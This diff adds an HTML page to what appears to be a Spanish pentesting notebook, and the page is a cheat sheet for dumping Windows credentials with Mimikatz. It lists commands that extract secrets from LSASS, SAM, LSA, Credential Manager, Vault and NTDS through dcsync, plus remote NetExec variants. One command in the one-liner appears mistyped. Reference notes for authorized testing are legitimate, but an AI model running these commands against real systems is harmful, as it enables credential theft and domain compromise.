@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Mimikatz | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="mimikatz">
+          <div class="note-tabbar">
+            <span>Mimikatz</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Post-Explotación/Windows/Dumping hashes</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">post-explotación / windows / dumping hashes</p>
+            <h2>Mimikatz</h2>
+
+            <p>Mimikatz permite interactuar con credenciales en memoria, secretos LSA y material de autenticación de Windows. Sus resultados dependen de privilegios, protecciones activas y contexto de dominio.</p>
+
+            <p><span class="notebook-review-note">Aviso: Requiere permisos elevados de <code>Administrator</code> para extraer <code>Hashes</code></span></p>
+            <section class="code-card">
+              <h3>Mimikatz</h3>
+              <pre><code>.\mimikatz.exe # Ejecuta Mimikatz
+privilege::debug # Habilita privilegio de depuración
+token::elevate   # Habilita privilegios elevados
+
+sekurlsa::logonpasswords # Extrae LSASS
+sekurlsa::credman # Extrae credenciales de Credential Manager
+vault::cred /patch # Extrae credenciales de Windows Vault  
+
+lsadump::sam # Extrae SAM y SYSTEM
+lsadump::secrets # Extrae SECURITY
+lsadump::lsa # Extrae secretos LSA usando SECURITY + SYSTEM
+lsadump::lsa /patch # Extrae secretos LSA usando SECURITY + SYSTEM
+
+lsadump::dcsync # Extrae NTDS
+
+# LSASS: Proceso que ejecuta LSA y almacena en su memoria credenciales locales y dominio
+# SAM: Base de datos de credenciales locales. Se descifra con SYSTEM
+# SECURITY: Registro que almacena credenciales de LSA Secrets
+# NTDS.dit: Base de datos de credenciales del dominio.</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Mimikatz OneLiner</h3>
+              <pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;lsadump:secrets&quot; &quot;exit&quot;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Kali: Mimikatz</h3>
+              <pre><code>nxc smb &lt;ip&gt; -u &lt;user_admin&gt; -p &lt;pass&gt; -M mimikatz
+nxc smb &lt;ip&gt; -u &lt;user_admin&gt; -p &lt;pass&gt; --local-auth -M mimikatz
+nxc smb &lt;ip&gt; -u &lt;user_admin&gt; -p &lt;pass&gt; -M mimikatz -o COMMAND=&#x27;privilege::debug&#x27;</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>post_explotacion</span>
+              <span>dumping_hashes</span>
+              <span>mimikatz</span>
+              <span>lsass</span>
+              <span>sam</span>
+              <span>ntds</span>
+              <span>lsa_secrets</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
